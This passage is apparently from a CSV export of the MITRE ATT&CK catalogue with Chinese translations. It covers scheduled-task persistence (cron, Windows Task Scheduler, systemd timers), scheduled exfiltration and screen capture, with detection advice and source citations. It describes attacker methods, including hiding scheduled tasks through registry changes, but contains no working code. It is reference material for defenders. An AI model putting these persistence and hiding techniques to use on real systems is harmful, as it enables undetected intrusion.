Kubernetes）提供的任务调度功能来调度配置为执行恶意代码的容器的部署。容器编排作业在特定日期和时间运行这些自动化任务，类似于 Linux 系统上的 cron 作业。这种类型的部署也可以配置为随着时间的推移维护一定数量的容器，自动化在集群内维护持久性的过程。在 Kubernetes 中，CronJob 可用于调度运行一个或多个容器以执行特定任务的作业。（引用：Kubernetes 作业）（引用：Kubernetes CronJob）因此，攻击者可以利用 CronJob 来调度执行的作业的部署集群内各个节点中的恶意代码。（引用：Kubernetes 威胁矩阵）
T1053.003,Scheduled Task/Job: Cron,"Adversaries may abuse the <code>cron</code> utility to perform task scheduling for initial or recurring execution of malicious code.(Citation: 20 macOS Common Tools and Techniques) The <code>cron</code> utility is a time-based job scheduler for Unix-like operating systems.  The <code> crontab</code> file contains the schedule of cron entries to be run and the specified times for execution. Any <code>crontab</code> files are stored in operating system-specific file paths.

An adversary may use <code>cron</code> in Linux or Unix environments to execute programs at system startup or on a scheduled basis for [Persistence](https://attack.mitre.org/tactics/TA0003). ",https://attack.mitre.org/techniques/T1053/003,03 December 2019,24 March 2022,1.1,"Execution, Persistence, Privilege Escalation","Monitor scheduled task creation from common utilities using command-line invocation. Legitimate scheduled tasks may be created during installation of new software or through system administration functions. Look for changes to tasks that do not correlate with known software, patch cycles, etc.  

Suspicious program execution through scheduled tasks may show up as outlier processes that have not been seen before when compared against historical data. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement. ","Linux, macOS","Command: Command Execution, File: File Modification, Process: Process Creation, Scheduled Job: Scheduled Job Creation",True,T1053,,,User,,,,,,"(Citation: Talos Rocke August 2018),(Citation: Aqua Kinsing April 2020),(Citation: CheckPoint SpeakUp Feb 2019),(Citation: Janicab),(Citation: Unit 42 Rocke January 2019),(Citation: Anomali Rocke March 2019),(Citation: CISA AA20-239A BeagleBoyz August 2020),(Citation: ESET TeleBots Oct 2018),(Citation: Red Canary NETWIRE January 2020),(Citation: Unit42 Xbash Sept 2018),(Citation: Medium Anchor DNS July 2020),(Citation: CrowdStrike StellarParticle January 2022),(Citation: ANSSI Sandworm January 2021),(Citation: Leonardo Turla Penquin May 2020),(Citation: Trend Micro Skidmap),",计划任务/作业：Cron,攻击者可能会滥用 <code>cron</code> 实用程序来为恶意代码的初始或重复执行执行任务调度。（引用：20 macOS 常用工具和技术）<code>cron</code> 实用程序是一个时间-基于类 Unix 操作系统的作业调度程序。 <code> crontab</code> 文件包含要运行的 cron 条目的计划和指定的执行时间。任何 <code>crontab</code> 文件都存储在操作系统特定的文件路径中。攻击者可以在 Linux 或 Unix 环境中使用 <code>cron</code> 在系统启动时或为 [Persistence] (https://attack.mitre.org/tactics/TA0003) 定期执行程序。
T1053.005,Scheduled Task/Job: Scheduled Task,"Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code. There are multiple ways to access the Task Scheduler in Windows. The [schtasks](https://attack.mitre.org/software/S0111) utility can be run directly on the command line, or the Task Scheduler can be opened through the GUI within the Administrator Tools section of the Control Panel. In some cases, adversaries have used a .NET wrapper for the Windows Task Scheduler, and alternatively, adversaries have used the Windows netapi32 library to create a scheduled task.

The deprecated [at](https://attack.mitre.org/software/S0110) utility could also be abused by adversaries (ex: [At](https://attack.mitre.org/techniques/T1053/002)), though <code>at.exe</code> can not access tasks created with <code>schtasks</code> or the Control Panel.

An adversary may use Windows Task Scheduler to execute programs at system startup or on a scheduled basis for persistence. The Windows Task Scheduler can also be abused to conduct remote Execution as part of Lateral Movement and/or to run a process under the context of a specified account (such as SYSTEM). Similar to [System Binary Proxy Execution](https://attack.mitre.org/techniques/T1218), adversaries have also abused the Windows Task Scheduler to potentially mask one-time execution under signed/trusted system processes.(Citation: ProofPoint Serpent)

Adversaries may also create ""hidden"" scheduled tasks (i.e. [Hide Artifacts](https://attack.mitre.org/techniques/T1564)) that may not be visible to defender tools and manual queries used to enumerate tasks. Specifically, an adversary may hide a task from `schtasks /query` and the Task Scheduler by deleting the associated Security Descriptor (SD) registry value (where deletion of this value must be completed using SYSTEM permissions).(Citation: SigmaHQ)(Citation: Tarrask scheduled task) Adversaries may also employ alternate methods to hide tasks, such as altering the metadata (e.g., `Index` value) within associated registry keys.(Citation: Defending Against Scheduled Task Attacks in Windows Environments) ",https://attack.mitre.org/techniques/T1053/005,27 November 2019,06 July 2022,1.2,"Execution, Persistence, Privilege Escalation","Monitor process execution from the <code>svchost.exe</code> in Windows 10 and the Windows Task Scheduler <code>taskeng.exe</code> for older versions of Windows. (Citation: Twitter Leoloobeek Scheduled Task) If scheduled tasks are not used for persistence, then the adversary is likely to remove the task when the action is complete. Monitor Windows Task Scheduler stores in %systemroot%\System32\Tasks for change entries related to scheduled tasks that do not correlate with known software, patch cycles, etc.

Configure event logging for scheduled task creation and changes by enabling the ""Microsoft-Windows-TaskScheduler/Operational"" setting within the event logging service. (Citation: TechNet Forum Scheduled Task Operational Setting) Several events will then be logged on scheduled task activity, including: (Citation: TechNet Scheduled Task Events)(Citation: Microsoft Scheduled Task Events Win10)

* Event ID 106 on Windows 7, Server 2008 R2 - Scheduled task registered
* Event ID 140 on Windows 7, Server 2008 R2 / 4702 on Windows 10, Server 2016 - Scheduled task updated
* Event ID 141 on Windows 7, Server 2008 R2 / 4699 on Windows 10, Server 2016 - Scheduled task deleted
* Event ID 4698 on Windows 10, Server 2016 - Scheduled task created
* Event ID 4700 on Windows 10, Server 2016 - Scheduled task enabled
* Event ID 4701 on Windows 10, Server 2016 - Scheduled task disabled

Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current scheduled tasks. (Citation: TechNet Autoruns)

Remote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. Tasks may also be created through Windows system management tools such as Windows Management Instrumentation and PowerShell, so additional logging may need to be configured to gather the appropriate data.",Windows,"Command: Command Execution, File: File Modification, Process: Process Creation, Scheduled Job: Scheduled Job Creation, Windows Registry: Windows Registry Key Creation",True,T1053,,"Andrew Northern, @ex_raritas; Bryan Campbell, @bry_campbell; Selena Larson, @selenalarson; Sittikorn Sangrattanapitak; Zachary Abzug, @ZackDoesML",Administrator,1.0,,,,,"(Citation: PWC Cloud Hopper Technical Annex April 2017),(Citation: Talos Smoke Loader July 2018),(Citation: Cyberreason Anchor December 2019),(Citation: CISA SoreFang July 2016),(Citation: FireEye APT32 May 2017),(Citation: Cybereason Valak May 2020),(Citation: CrowdStrike SUNSPOT Implant January 2021),(Citation: Volexity SolarWinds),(Citation: CopyKittens Nov 2015),(Citation: ESET Gamaredon June 2020),(Citation: Kaspersky Lyceum October 2021),(Citation: FoxIT Wocao December 2019),(Citation: ESET Sednit Part 1),(Citation: ESET RTM Feb 2017),(Citation: ESET Crutch December 2020),(Citation: ClearSky OilRig Jan 2017),(Citation: ClearSky Wilted Tulip July 2017),(Citation: ESET OceanLotus Mar 2019),(Citation: Kaspersky QakBot September 2021),(Citation: FireEye KEGTAP SINGLEMALT October 2020),(Citation: GitHub PowerSploit May 2012),(Citation: ESET Lazarus Jun 2020),(Citation: OilRig New Delivery Oct 2017),(Citation: Group IB Ransomware September 2020),(Citation: Cybereason Bazar July 2020),(Citation: Volexity Patchwork June 2018),(Citation: Talos Lokibot Jan 2021),(Citation: Secureworks BRONZE PRESIDENT December 2019),(Citation: Symantec Shuckworm January 2022),(Citation: FireEye FIN6 April 2016),(Citation: KISA Operation Muzabi),(Citation: BlackBerry CostaRicto November 2020),(Citation: FireEye Know Your Enemy FIN8 Aug 2016),(Citation: FireEye APT34 July 2019),(Citation: Crowdstrike Qakbot October 2020),(Citation: Prevailion DarkWatchman 2021),(Citation: DFIR Ryuk 2 Hour Speed Run November 2020),(Citation: FireEye APT34 Dec 2017),(Citation: Cyber Forensicator Silence Jan 2019),(Citation: ANSSI RYUK RANSOMWARE),(Citation: Proofpoint TA505 Jan 2019),(Citation: Unit 42 OilRig Sept 2018),(Citation: Reaqta MuddyWater November 2017),(Citation: SecureWorks August 2019),(Citation: Zscaler Higaisa 2020),(Citation: Github PowerShell Empire),(Citation: Unit42 Molerat Mar 2020),(Citation: S2 Grupo TrickBot June 2017),(Citation: Tarrask scheduled task),(Citation: Unit 42 Valak July 2020),(Citation: Unit 42 BackConfig May 2020),(Citation: Unit42 Redaman January 2019),(Citation: FireEye FIN10 June 2017),(Citation: Unit 42 OopsIE! Feb 2018),(Citation: McAfee Night Dragon),(Citation: FBI FLASH APT39 September 2020),(Citation: Volexity InkySquid RokRAT August 2021),(Citation: Secureworks BRONZE BUTLER Oct 2017),(Citation: CERT-EE Gamaredon January 2021),(Citation: Trend Micro Totbrick Oct 2016),(Citation: Morphisec FIN7 June 2017),(Citation: Cybereason Oceanlotus May 2017),(Citation: FireEye SUNBURST Backdoor December 2020),(Citation: QiAnXin APT-C-36 Feb2019),(Citation: Cybereason Kimsuky November 2020),(Citation: 360 Machete Sep 2020),(Citation: Trend Micro Qakbot December 2020),(Citation: ESET Okrum July 2019),(Citation: ESET Carbon Mar 2017),(Citation: Flashpoint FIN 7 March 2019),(Citation: PaloAlto Patchwork Mar 2018),(Citation: Unit 42 IronNetInjector February 2021 ),(Citation: CrowdStrike Grim Spider May 2019),(Citation: SecureList Griffon May 2019),(Citation: F-Secure CozyDuke),(Citation: PowerSploit Documentation),(Citation: Check Point APT34 April 2021),(Citation: Cybereason Cobalt Kitty 2017),(Citation: US-CERT TA18-074A),(Citation: Proofpoint Bumblebee April 2022),(Citation: Cyphort EvilBunny Dec 2014),(Citation: Cisco Talos Bitter Bangladesh May 2022),(Citation: FireEye FIN7 Aug 2018),(Citation: Microsoft Totbrick Oct 2017),(Citation: US-CERT Emotet Jul 2018),(Citation: TrendMicro Patchwork Dec 2017),(Citation: Mandiant No Easy Breach),(Citation: MSTIC NOBELIUM Mar 2021),(Citation: Eset Ramsay May 2020),(Citation: Microsoft Actinium February 2022),(Citation: Unit 42 QUADAGENT July 2018),(Citation: CISA ComRAT Oct 2020),(Citation: Cycraft Chimera April 2020),(Citation: Group IB Cobalt Aug 2017),(Citation: Malwarebytes Higaisa 2020),(Citation: MalwareBytes LazyScripter Feb 2021),(Citation: Symantec Elfin Mar 2019),(Citation: F-Secure Cosmicduke),(Citation: Cybereason OperationCuckooBees May 2022),(Citation: Kroll Qakbot June 2020),(Citation: McAfee Dianxun March 2021),(Citation: Securelist Remexi Jan 2019),(Citation: Mandiant UNC3890 Aug 2022),(Citation: Unit 42 Lucifer June 2020),(Citation: NCC Group Team9 June 2020),(Citation: Symantec W32.Duqu),(Citation: Symantec Bumblebee June 2022),(Citation: ESET InvisiMole June 2020),(Citation: BitDefender Chafer May 2020),(Citation: Symantec Buckeye),(Citation: FireEye NETWIRE March 2019),(Citation: ESET ComRAT May 2020),(Citation: Trend Micro Qakbot May 2020),(Citation: Palo Alto Gamaredon Feb 2017),(Citation: CISA AR18-352A Quasar RAT December 2018),(Citation: Cybereason Soft Cell June 2019),(Citation: CISA AppleJeus Feb 2021),(Citation: Talos Nyetya June 2017),(Citation: Talos GravityRAT),(Citation: CISA AA20-239A BeagleBoyz August 2020),(Citation: ESET Twitter Ida Pro Nov 2021),(Citation: Group IB GrimAgent July 2021),(Citation: CrowdStrike Carbon Spider August 2021),(Citation: Kaspersky Tomiris Sep 2021),(Citation: Securelist Machete Aug 2014),(Citation: Cofense RevengeRAT Feb 2019),(Citation: SentinelOne Valak June 2020),(Citation: Anomali MUSTANG PANDA October 2019),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: TechNet Schtasks),(Citation: Symantec W.32 Stuxnet Dossier),(Citation: TrendMicro Confucius APT Aug 2021),(Citation: Palo Alto Shamoon Nov 2016),(Citation: Rancor Unit42 June 2018),(Citation: Red Canary Qbot),(Citation: ESET Sednit July 2015),(Citation: Crowdstrike GTR2020 Mar 2020),(Citation: ClearSky Siamesekitten August 2021),(Citation: Secure List Bad Rabbit),(Citation: Talos Frankenstein June 2019),(Citation: FireEye APT39 Jan 2019),(Citation: RedCanary Mockingbird May 2020),(Citation: Qualys LolZarus),(Citation: ESET Machete July 2019),(Citation: Palo Alto OilRig Sep 2018),(Citation: Citizen Lab Stealth Falcon May 2016),(Citation: Accenture Lyceum Targets November 2021),(Citation: FireEye FIN7 April 2017),(Citation: Kaspersky WIRTE November 2021),(Citation: FireEye Shamoon Nov 2016),(Citation: FireEye APT41 Aug 2019),(Citation: DHS/CISA Ransomware Targeting Healthcare October 2020),(Citation: CISA AA20-259A Iran-Based Actor September 2020),(Citation: Malwarebytes Saint Bot April 2021),(Citation: ClearSky MuddyWater Nov 2018),(Citation: Sophos Maze VM September 2020),(Citation: Cybereason Molerats Dec 2020),(Citation: ASERT Donot March 2018),(Citation: Bitdefender Naikon April 2021),(Citation: ClearSky Pay2Kitten December 2020),(Citation: Securelist WhiteBear Aug 2017),(Citation: FireEye TRITON 2019),(Citation: Secureworks MCMD July 2019),(Citation: NCC Group Chimera January 2021),(Citation: ESET Attor Oct 2019),(Citation: Juniper IcedID June 2020),(Citation: Check Point Meteor Aug 2021),(Citation: DFIR Report APT35 ProxyShell March 2022),(Citation: CISA Zebrocy Oct 2020),(Citation: Carbon Black HotCroissant April 2020),(Citation: Symantec Ukraine Wipers February 2022),(Citation: Cyberint Qakbot May 2021),(Citation: ESET Gazer Aug 2017),(Citation: SentinelLabs Agent Tesla Aug 2020),(Citation: Malwarebytes Dyreza November 2015),(Citation: FireEye Operation Double Tap),(Citation: TechNet Scheduling Priority),(Citation: Powersploit),(Citation: TechNet Server Operator Scheduled Task)",计划任务/作业：计划任务,攻击者可能会滥用 Windows 任务计划程序来执行任务计划，以执行恶意代码的初始或重复执行。有多种方法可以访问 Windows 中的任务计划程序。 [schtasks](https://attack.mitre.org/software/S0111) 实用程序可以直接在命令行上运行，或者可以通过控制面板的管理员工具部分中的 GUI 打开任务计划程序。在某些情况下，攻击者使用 Windows 任务计划程序的 .NET 包装器，或者，攻击者使用 Windows netapi32 库来创建计划任务。已弃用的 [at](https://attack.mitre.org/software/S0110) 实用程序也可能被对手滥用（例如：[At](https://attack.mitre.org/techniques/T1053/002) )，尽管 <code>at.exe</code> 无法访问使用 <code>schtasks</code> 或控制面板创建的任务。攻击者可能会使用 Windows 任务计划程序在系统启动时或按计划执行程序以实现持久性。 Windows 任务计划程序也可以被滥用来执行远程执行作为横向移动的一部分和/或在指定帐户（例如 SYSTEM）的上下文下运行进程。与 [System Binary Proxy Execution](https://attack.mitre.org/techniques/T1218) 类似，攻击者还滥用 Windows 任务计划程序来潜在地掩盖签名/受信任系统进程下的一次性执行。（引用：ProofPoint Serpent）攻击者还可能创建“隐藏”的计划任务（即[隐藏工件](https://attack.mitre.org/techniques/T1564)），防御者工具和用于枚举任务的手动查询可能看不到这些任务。具体来说，攻击者可以通过删除相关的安全描述符 (SD) 注册表值（必须使用系统权限完成此值的删除）来隐藏“schtasks /query”和任务计划程序中的任务。（引用：SigmaHQ）（引用：Tarrask 计划任务）攻击者还可以使用替代方法来隐藏任务，例如更改相关注册表项中的元数据（例如，“索引”值）。（引用：防御 Windows 环境中的计划任务攻击）
T1053.006,Scheduled Task/Job: Systemd Timers,"Adversaries may abuse systemd timers to perform task scheduling for initial or recurring execution of malicious code. Systemd timers are unit files with file extension <code>.timer</code> that control services. Timers can be set to run on a calendar event or after a time span relative to a starting point. They can be used as an alternative to [Cron](https://attack.mitre.org/techniques/T1053/003) in Linux environments.(Citation: archlinux Systemd Timers Aug 2020) Systemd timers may be activated remotely via the <code>systemctl</code> command line utility, which operates over [SSH](https://attack.mitre.org/techniques/T1021/004).(Citation: Systemd Remote Control)

Each <code>.timer</code> file must have a corresponding <code>.service</code> file with the same name, e.g., <code>example.timer</code> and <code>example.service</code>. <code>.service</code> files are [Systemd Service](https://attack.mitre.org/techniques/T1543/002) unit files that are managed by the systemd system and service manager.(Citation: Linux man-pages: systemd January 2014) Privileged timers are written to <code>/etc/systemd/system/</code> and <code>/usr/lib/systemd/system</code> while user level are written to <code>~/.config/systemd/user/</code>.

An adversary may use systemd timers to execute malicious code at system startup or on a scheduled basis for persistence.(Citation: Arch Linux Package Systemd Compromise BleepingComputer 10JUL2018)(Citation: gist Arch package compromise 10JUL2018)(Citation: acroread package compromised Arch Linux Mail 8JUL2018) Timers installed using privileged paths may be used to maintain root level persistence. Adversaries may also install user level timers to achieve user level persistence.",https://attack.mitre.org/techniques/T1053/006,12 October 2020,27 July 2021,1.1,"Execution, Persistence, Privilege Escalation","Systemd timer unit files may be detected by auditing file creation and modification events within the <code>/etc/systemd/system</code>, <code>/usr/lib/systemd/system/</code>, and <code>~/.config/systemd/user/</code> directories, as well as associated symbolic links. Suspicious processes or scripts spawned in this manner will have a parent process of ‘systemd’, a parent process ID of 1, and will usually execute as the ‘root’ user.

Suspicious systemd timers can also be identified by comparing results against a trusted system baseline. Malicious systemd timers may be detected by using the systemctl utility to examine system wide timers: <code>systemctl list-timers –all</code>. Analyze the contents of corresponding <code>.service</code> files present on the file system and ensure that they refer to legitimate, expected executables.

Audit the execution and command-line arguments of the 'systemd-run' utility as it may be used to create timers.(Citation: archlinux Systemd Timers Aug 2020)",Linux,"Command: Command Execution, File: File Modification, Process: Process Creation, Scheduled Job: Scheduled Job Creation",True,T1053,,"SarathKumar Rajendran, Trimble Inc","root, User",1.0,,,,,",",计划任务/作业：Systemd Timers,攻击者可能会滥用 systemd 计时器来执行恶意代码的初始或重复执行的任务调度。 Systemd 计时器是具有文件扩展名 <code>.timer</code> 的单元文件，用于控制服务。计时器可以设置为在日历事件上或在相对于起点的时间跨度之后运行。它们可以在 Linux 环境中用作 [Cron](https://attack.mitre.org/techniques/T1053/003) 的替代品。（引用：archlinux Systemd Timers Aug 2020）可以通过 < code>systemctl</code> 命令行实用程序，通过 [SSH](https://attack.mitre.org/techniques/T1021/004) 运行。（引用：Systemd 远程控制）每个 <code>.timer</ code> 文件必须有一个对应的同名<code>.service</code> 文件，例如<code>example.timer</code> 和<code>example.service</code>。 <code>.service</code> 文件是由 systemd 系统和服务管理器管理的 [Systemd Service](https://attack.mitre.org/techniques/T1543/002) 单元文件。（引用：Linux man -pages: systemd 2014 年 1 月）特权计时器写入 <code>/etc/systemd/system/</code> 和 <code>/usr/lib/systemd/system</code> 而用户级别写入 <code >~/.config/systemd/user/</code>。攻击者可能会使用 systemd 计时器在系统启动时或按计划执行恶意代码以实现持久性。（引用：Arch Linux 包 Systemd Compromise BleepingComputer 10JUL2018）（引用：gist Arch 包破坏 10JUL2018）（引用：acroread 包破坏 Arch Linux 邮件8JUL2018) 使用特权路径安装的计时器可用于维护根级别的持久性。攻击者还可以安装用户级计时器以实现用户级持久性。
T1029,Scheduled Transfer,"Adversaries may schedule data exfiltration to be performed only at certain times of day or at certain intervals. This could be done to blend traffic patterns with normal activity or availability.

When scheduled exfiltration is used, other exfiltration techniques likely apply as well to transfer the information out of the network, such as [Exfiltration Over C2 Channel](https://attack.mitre.org/techniques/T1041) or [Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048).",https://attack.mitre.org/techniques/T1029,31 May 2017,28 March 2020,1.1,Exfiltration,Monitor process file access patterns and network behavior. Unrecognized processes or scripts that appear to be traversing file systems and sending network traffic may be suspicious. Network connections to the same destination that occur at the same time of day for multiple days are suspicious.,"Linux, Windows, macOS","Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Flow",False,,,,,,,,,,"(Citation: ESET Gelsemium June 2021),(Citation: ESET LightNeuron May 2019),(Citation: ESET Machete July 2019),(Citation: ClearSky Siamesekitten August 2021),(Citation: FOX-IT May 2016 Mofang),(Citation: cobaltstrike manual),(Citation: Symantec Linfo May 2012),(Citation: Talos TinyTurla September 2021),(Citation: Kaspersky Adwind Feb 2016),(Citation: Microsoft PLATINUM April 2016),(Citation: ESET Sednit Part 2),(Citation: ESET ComRAT May 2020),(Citation: Unit 42 Kazuar May 2017),(Citation: NTT Security Flagpro new December 2021),(Citation: PTSecurity Higaisa 2020),(Citation: Securelist ShadowPad Aug 2017),(Citation: FireEye MuddyWater Mar 2018),(Citation: University of Birmingham C2)",定期转移,攻击者可能会安排仅在一天中的特定时间或特定时间间隔执行数据泄露。可以这样做以将流量模式与正常活动或可用性相结合。当使用预定的渗透时，其他渗透技术也可能适用于将信息传输到网络之外，例如 [Exfiltration Over C2 Channel](https://attack.mitre.org/techniques/T1041) 或 [Exfiltration Over Alternative协议]（https://attack.mitre.org/techniques/T1048）。
T1113,Screen Capture,"Adversaries may attempt to take screen captures of the desktop to gather information over the course of an operation. Screen capturing functionality may be included as a feature of a remote access tool used in post-compromise operations. Taking a screenshot is also typically possible through native utilities or API calls, such as <code>CopyFromScreen</code>, <code>xwd</code>, or <code>screencapture</code>.(Citation: CopyFromScreen .NET)(Citation: Antiquated Mac Malware)
",https://attack.mitre.org/techniques/T1113,31 May 2017,24 March 2020,1.1,Collection,"Monitoring for screen capture behavior will depend on the method used to obtain data from the operating system and write output files. Detection methods could include collecting information from unusual processes using API calls used to obtain image data, and monitoring for image files written to disk. The sensor data may need to be correlated with other events to identify malicious activity, depending on the legitimacy of this behavior within a given network environment.","Linux, Windows, macOS","Command: Command Execution, Process: OS API Execution",False,,,,,,,CAPEC-648,,,"(Citation: PWC Cloud Hopper Technical Annex April 2017),(Citation: Proofpoint LookBack Malware Aug 2019),(Citation: Cybereason Valak May 2020),(Citation: Kaspersky Adwind Feb 2016),(Citation: trendmicro xcsset xcode project 2020),(Citation: Cylance Shaheen Nov 2018),(Citation: CopyKittens Nov 2015),(Citation: ESET Gamaredon June 2020),(Citation: ESET RTM Feb 2017),(Citation: Proofpoint Operation Transparent Tribe March 2016),(Citation: Trend Micro Tick November 2019),(Citation: Securelist Octopus Oct 2018),(Citation: FinFisher Citation),(Citation: ClearSky Wilted Tulip July 2017),(Citation: ESET Zebrocy Nov 2018),(Citation: ESET Sednit Part 2),(Citation: GitHub PowerSploit May 2012),(Citation: ESET Operation Groundbait),(Citation: ESET Zebrocy May 2019),(Citation: Cylance Machete Mar 2017),(Citation: Unit42 Emissary Panda May 2019),(Citation: Objective-See MacMa Nov 2021),(Citation: Symantec Dragonfly Sept 2017),(Citation: Trend Micro Iron Tiger April 2021),(Citation: Malwarebytes Kimsuky June 2021),(Citation: Cybereason Chaes Nov 2020),(Citation: FireEye Metamorfo Apr 2018),(Citation: Zscaler Cobian Aug 2017),(Citation: Symantec Hydraq Jan 2010),(Citation: FireEye APT10 April 2017),(Citation: Palo Alto T9000 Feb 2016),(Citation: Unit 42 DarkHydrus July 2018),(Citation: Gigamon Berserk Bear October 2021),(Citation: GitHub SILENTTRINITY Modules July 2019),(Citation: Volexity InkySquid BLUELIGHT August 2021),(Citation: KISA Operation Muzabi),(Citation: Trend Micro DRBControl February 2020),(Citation: Cisco Talos Transparent Tribe Education Campaign July 2022),(Citation: Kaspersky TajMahal April 2019),(Citation: Fortinet Agent Tesla April 2018),(Citation: Forcepoint Monsoon),(Citation: FireEye APT34 Dec 2017),(Citation: ESET BackdoorDiplomacy Jun 2021),(Citation: Kaspersky Transparent Tribe August 2020),(Citation: FireEye APT33 Sept 2017),(Citation: Talos Seduploader Oct 2017),(Citation: Symantec Chafer Dec 2015),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: CheckPoint Naikon May 2020),(Citation: Unit42 Sofacy Dec 2018),(Citation: CIRCL PlugX March 2013),(Citation: Secureworks Karagany July 2019),(Citation: Github PowerShell Empire),(Citation: DOJ FIN7 Aug 2018),(Citation: Symantec Dragonfly),(Citation: Unit42 Redaman January 2019),(Citation: FireEye Shining A Light on DARKSIDE May 2021),(Citation: CISA EB Aug 2020),(Citation: Unit 42 Playbook Dec 2017),(Citation: FBI FLASH APT39 September 2020),(Citation: Cybereason StrifeWater Feb 2022),(Citation: Profero APT27 December 2020),(Citation: Secureworks BRONZE BUTLER Oct 2017),(Citation: FireEye APT34 Webinar Dec 2017),(Citation: TrendMicro Ursnif Mar 2015),(Citation: Check Point APT35 CharmPower January 2022),(Citation: FireEye Periscope March 2018),(Citation: DOJ GRU Indictment Jul 2018),(Citation: 360 Machete Sep 2020),(Citation: Radware Micropsia July 2018),(Citation: Talos ROKRAT 2),(Citation: Antiy CERT Ramsay April 2020),(Citation: Unit 42 VERMIN Jan 2018),(Citation: DigiTrust Agent Tesla Jan 2017),(Citation: FireEye CARBANAK June 2017),(Citation: Unit 42 Kazuar May 2017),(Citation: Talos Agent Tesla Oct 2018),(Citation: BiZone Lizar May 2021),(Citation: PaloAlto Patchwork Mar 2018),(Citation: SecureList Griffon May 2019),(Citation: PowerSploit Documentation),(Citation: Prevx Carberp March 2011),(Citation: Janicab),(Citation: Symantec Chafer February 2018),(Citation: US-CERT TA18-074A),(Citation: Talos Konni May 2017),(Citation: Red Canary NETWIRE January 2020),(Citation: Secureworks IRON TWILIGHT Active Measures March 2017),(Citation: Symantec Catchamas April 2018),(Citation: Dragos Threat Report 2020),(Citation: CheckPoint Bandook Nov 2020),(Citation: Lookout Dark Caracal Jan 2018),(Citation: TrendMicro Patchwork Dec 2017),(Citation: Talos ROKRAT),(Citation: Cylance Dust Storm),(Citation: FireEye APT37 Feb 2018),(Citation: Fortinet Agent Tesla June 2017),(Citation: Microsoft Actinium February 2022),(Citation: BleepingComputer Molerats Dec 2020),(Citation: Security Affairs DustSquad Oct 2018),(Citation: F-Secure Cosmicduke),(Citation: Unit 42 BadPatch Oct 2017),(Citation: Securelist Remexi Jan 2019),(Citation: Unit42 Azorult Nov 2018),(Citation: GitHub Pupy),(Citation: Securelist MuddyWater Oct 2018),(Citation: Accenture SNAKEMACKEREL Nov 2018),(Citation: Proofpoint NETWIRE December 2020),(Citation: Talos Oblique RAT March 2021),(Citation: Trend Micro Daserf Nov 2017),(Citation: Unit42 Cannon Nov 2018),(Citation: ESET InvisiMole June 2020),(Citation: FireEye NETWIRE March 2019),(Citation: ESET InvisiMole June 2018),(Citation: NCCGroup RokRat Nov 2018),(Citation: Unit 42 Magic Hound Feb 2017),(Citation: Kaspersky Ferocious Kitten Jun 2021),(Citation: Palo Alto Gamaredon Feb 2017),(Citation: FireEye MuddyWater Mar 2018),(Citation: Trend Micro njRAT 2018),(Citation: Unit 42 Gamaredon February 2022),(Citation: TrendMicro BKDR_URSNIF.SM),(Citation: Kaspersky MoleRATs April 2019),(Citation: Group IB Silence Sept 2018),(Citation: Korean FSI TA505 2020),(Citation: FireEye SMOKEDHAM June 2021),(Citation: Kaspersky StoneDrill 2017),(Citation: Securelist Machete Aug 2014),(Citation: GitHub Sliver Screen),(Citation: Threatpost Lizar May 2021),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: Unit 42 Nokki Oct 2018),(Citation: CISA MAR SLOTHFULMEDIA October 2020),(Citation: Cylance Cleaver),(Citation: ESET DazzleSpy Jan 2022),(Citation: Talos PoetRAT April 2020),(Citation: ESET Gelsemium June 2021),(Citation: SecureList Silence Nov 2017),(Citation: jRAT Symantec Aug 2018),(Citation: Malwarebytes RokRAT VBA January 2021),(Citation: PWC KeyBoys Feb 2017),(Citation: Nccgroup Gh0st April 2018),(Citation: objsee mac malware 2017),(Citation: ESET Machete July 2019),(Citation: TrendMicro BlackTech June 2017),(Citation: FireEye FIN7 April 2017),(Citation: Kaspersky WIRTE November 2021),(Citation: f-secure janicab),(Citation: McAfee Netwire Mar 2015),(Citation: FireEye APT41 Aug 2019),(Citation: US-CERT KEYMARBLE Aug 2018),(Citation: TrendMicro POWERSTATS V3 June 2019),(Citation: ESET Casbaneiro Oct 2019),(Citation: GDATA Zeus Panda June 2017),(Citation: FireEye APT10 Sept 2018),(Citation: XAgentOSX 2017),(Citation: Anomali Static Kitten February 2021),(Citation: Kaspersky Flame),(Citation: cobaltstrike manual),(Citation: ESET Nomadic Octopus 2018),(Citation: Accenture Hogfish April 2018),(Citation: Cybereason Molerats Dec 2020),(Citation: Zscaler Kasidet),(Citation: ASERT Donot March 2018),(Citation: Unit42 RDAT July 2020),(Citation: Securelist ScarCruft May 2019),(Citation: Bitdefender Naikon April 2021),(Citation: Mandiant APT1 Appendix),(Citation: Trend Micro Muddy Water March 2021),(Citation: Tetra Defense Sodinokibi March 2020),(Citation: Securelist BlackEnergy Nov 2014),(Citation: Citizen Lab Group5),(Citation: ESET Attor Oct 2019),(Citation: PaloAlto CardinalRat Apr 2017),(Citation: Palo Alto Rover),(Citation: Amnesty Intl. Ocean Lotus February 2021),(Citation: Riskiq Remcos Jan 2018),(Citation: Carbon Black HotCroissant April 2020),(Citation: CISA Zebrocy Oct 2020),(Citation: Bitdefender Agent Tesla April 2020),(Citation: Microsoft FinFisher March 2018),",屏幕截图/捕获,攻击者可能会尝试截取桌面的屏幕截图以在操作过程中收集信息。屏幕捕获功能可以作为在后妥协操作中使用的远程访问工具的一个特征。通常也可以通过本机实用程序或 API 调用来截取屏幕截图，例如 <code>CopyFromScreen</code>、<code>xwd</code> 或 <code>screencapture</code>。（引用：CopyFromScreen .NET )（引用：过时的 Mac 恶意软件）
T1597,Search Closed Sources,"Adversaries may search and gather information about victims from closed sources that can be used during targeting. Information about victims may be available for purchase from reputable private sources and databases, such as paid subscriptions to feeds of technical/threat intelligence data.(Citation: D3Secutrity CTI Feeds) Adversaries may also purchase information from less-reputable sources such as dark web or cybercrime blackmarkets.(Citation: ZDNET Selling Data)

